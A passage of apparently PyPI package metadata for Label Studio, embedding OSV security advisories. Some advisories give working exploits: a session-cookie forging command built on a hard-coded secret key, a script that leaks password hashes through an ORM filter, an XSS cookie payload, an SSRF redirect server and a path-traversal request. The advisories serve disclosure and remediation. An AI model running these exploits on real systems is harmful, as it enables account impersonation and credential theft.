vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.9.1.post1":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.9.1.post1/","requires_dist":["pip (>=20.2.3)","appdirs (==1.4.3)","attrs (>=19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","click (~=7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (>=1.17.4)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (>=2.22.0)","six (>=1.13.0)","srsly (>=0.2.0)","tqdm (>=4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","ordered-set (==4.0.2)","orjson (>=2.0.11)","rarfile (==3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","rq (>=1.0)","boto3 (>=1.12.32)","google-cloud-storage (==1.28.1)","flask-wtf (==0.14.3)","label-studio-converter (==0.0.23rc3)","htmlmin (==0.1.12)","gevent (>=20.6.2)","ujson (==3.0.0)","Colorama (==0.4.4)","boxing (==0.1.4)","redis (>=3.5)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)"],"requires_python":">=3.5, <3.9","summary":"Label Studio annotation tool","version":"0.9.1.post1","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"c4bbeaa6ea2fe5562e2d17af63b1d23a7f3a320f3c32309a031af2cdd046a167","md5":"004708c440261f06a8ea6ec7a719cc84","sha256":"1eb77ac088a1c8fc924da4362675b134f04b98ccc79464299c837fca914a8f54"},"downloads":-1,"filename":"label_studio-0.9.1.post1-py3-none-any.whl","has_sig":false,"md5_digest":"004708c440261f06a8ea6ec7a719cc84","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5, <3.9","size":13495685,"upload_time":"2021-02-18T16:37:55","upload_time_iso_8601":"2021-02-18T16:37:55.256919Z","url":"https://files.pythonhosted.org/packages/c4/bb/eaa6ea2fe5562e2d17af63b1d23a7f3a320f3c32309a031af2cdd046a167/label_studio-0.9.1.post1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"3ebc8a64d672ecf89b24bddb017eee6c5893430db7c4b50654190b1ed3c8ba22","md5":"b76df5df7b198e5387bd1eaaaf3b95ce","sha256":"83b7ef2f8c64abef12417c8c967bbb1fca287d2596301c1a61e781527ca069e4"},"downloads":-1,"filename":"label-studio-0.9.1.post1.tar.gz","has_sig":false,"md5_digest":"b76df5df7b198e5387bd1eaaaf3b95ce","packagetype":"sdist","python_version":"source","requires_python":">=3.5, <3.9","size":13394155,"upload_time":"2021-02-18T16:40:09","upload_time_iso_8601":"2021-02-18T16:40:09.986277Z","url":"https://files.pythonhosted.org/packages/3e/bc/8a64d672ecf89b24bddb017eee6c5893430db7c4b50654190b1ed3c8ba22/label-studio-0.9.1.post1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = 